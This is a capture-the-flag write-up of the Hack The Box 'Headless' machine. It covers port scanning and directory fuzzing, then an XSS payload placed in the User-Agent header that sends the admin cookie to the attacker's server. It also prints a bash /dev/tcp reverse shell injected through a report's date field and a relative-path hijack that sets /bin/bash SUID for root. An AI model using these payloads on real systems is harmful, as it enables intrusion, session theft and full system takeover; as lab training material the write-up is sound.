---
title: Hack the box Headless pwned!
date: 2024-03-28 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, machine, headless, werkzeug, xss, cookie hijacking, path hijacking]
img_path: /assets/img/posts/
---

![Headless info](htb-headless-info.png)
*Headless info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.60
>
>Target machine (victim, Headless): 10.10.11.8
{: .prompt-info}

## Enumeration

Let's go look for the open ports in the machine using `nmap`:

`nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.8`

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

## Footprinting

We fine tune the scan to see if we can get more information about the running services:

`nmap -Pn -n -sCV -p22,5000 -oN nmap_versions.txt 10.10.11.8`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 900294283dab2274df0ea3b20f2bc617 (ECDSA)
|_  256 2eb90824021b609460b384a99e1a60ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 28 Mar 2024 16:56:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=3/28%Time=6605A126%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Thu,\x2028\x20Mar\x202024\x2016:56:06\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that is running a `Werkzeug/2.2.2 Python/3.11.2` server on the port 5000.
`Werkzeug` is a WSGI (Web Server Gateway Interface) utility library for Python.
`Werkzeug` is library that provides a simple web server for development purposes.

And, we can see an interesting parameter: `Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/`

So, let's brose to the port 5000 in the machine:

![Website](htb-headless-website.png)
*Website*

For now we can't do anything here, so let's fuzz to see if we find hidden resources:

`gobuster dir -u http://10.10.11.8:5000 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
```

Ok, now we will browse to our new resources.

If we go to `/support` we will se a formulary to contact support:

![Support](htb-headless-support.png)
*Support*

If we go to `/dashboard` we will find a 401 unauthorized response:

![Dashboard unauthorized](htb-headless-dashboard-unauthorized.png)
*Dashboard unauthorized*

## Foothold

As we only can manipulate inputs in the `/support` form, we will try something there.
If, we remember, we found an interesting parameter before, scanning with nmap: `Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;`.
In the HTTP request headers there is a cookie sent which determine if we are admin, and, the `/dashboard` message, tell us that we need supply the right credentials to access.
So we need the admin credentials (cookie in this case) to try to access to the `/dashboard` section.

### Cookie hijacking with XSS

Under certain conditions, we can get another user's cookies (admin, in our case) using XSS.
To steal the admin cookie we are going to set up a web server in our machine, and we are going to do that the headless web server requests a resource from our server, the resource will be the admin cookie.

We set up a web server in our machine:

`sudo python3 -m http.server 80`

And, we will inject the payload `<script>document.location="http://10.10.16.60/xss-76.js?c="+document.cookie;</script>` to the headles server.

If we try to inject the payload from the support form, we will get an error:

![Hacking attempt detected](htb-headless-hacking-attempt-detected.png)
*Hacking attempt detected*

But, if we look closely, we can see that the message shows the User-Agent.
So it may be possible to inject the payload here using burp.

We fill the form with any information, we send it and we intercept the petition with burp.
Then, we modify the User-Agent field to inject our payload:

![User-Agent payload](htb-headless-user-agent-payload.png)
*User-Agent payload*

After a while, we will receive a petition in our web server:

```
10.10.11.8 - - [28/Mar/2024 19:55:09] code 404, message File not found
10.10.11.8 - - [28/Mar/2024 19:55:09] "GET /xss-76.js?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
10.10.11.8 - - [28/Mar/2024 19:55:10] code 404, message File not found
10.10.11.8 - - [28/Mar/2024 19:55:10] "GET /favicon.ico HTTP/1.1" 404 -
```

Now, we have the admin cookie: `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`, so we can try to access to the dashboard panel.
We request the `/dashboard` resource, we intercept the request with burp, and we modify the `Cookie` field to use the admin cookie:

![Cookie hijacking](htb-headless-cookie-hijacking.png)
*Cookie hijacking*

### Reverse shell

Now, we have access to the Administrator Dashboard:

![Administrator dashboard](htb-headless-administrator-dashboard.png)
*Administrator dashboard*

If we generate a report, and we intercept the request with burp, we can see that the field `date` is not escaped and we can perform a command injection here.

We start a listener on our machine:

`nc -lvnp 443`

And we inject the `bash -c "bash -i >& /dev/tcp/10.10.16.60/443 0>&1"` revershe shell on the `date` field:

![OS command injection](htb-headless-date-field-reverse-shell-injection.png)
*OS command injection: Injecting a reverse shell in the date field*

Now we urlencode our reverse shell:

![Urlencoded reverse shell](htb-headless-date-field-reverse-shell-injection-urlencoded.png)
*Urlencoded reverse shell*

### dvir

We got shell!
Let's find out some more information about our new user:

```
bash-5.2$ whoami
whoami
dvir
bash-5.2$ id
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
bash-5.2$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

We can get our user flag:

`cat /home/dvir/user.txt`

And, now, we need to escalate privileges to obtain the system flag.

## Privilege escalation

Our user, `divr`, can execute the `/usr/bin/syscheck` with root privileges without password, so let's take a look at the script:

```
bash-5.2$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

We can see that the script executes another script, `initdb.sh`, with a relative path, using the current directory (`.`), so we can perform a path hijacking.

### Path hijacking

We can create a `initdb.sh` script that sets SUID to the `/bin/bash`:

```
bash-5.2$ echo "chmod u+s /bin/bash" > initdb.sh
bash-5.2$ chmod +x initdb.s
```

We execute the `/usr/bin/syscheck` script:

`bash-5.2$ sudo /usr/bin/syscheck`

And, now, we can execute `/bin/bash` with root privileges:

`bash-5.2$ bash -p`

Finally, we are root, and we can get our system flag:

`cat /root/root.txt`

![Headless pwned](htb-headless-pwned.png)
*Headless has been Pwned*

*Enjoy! ;)*
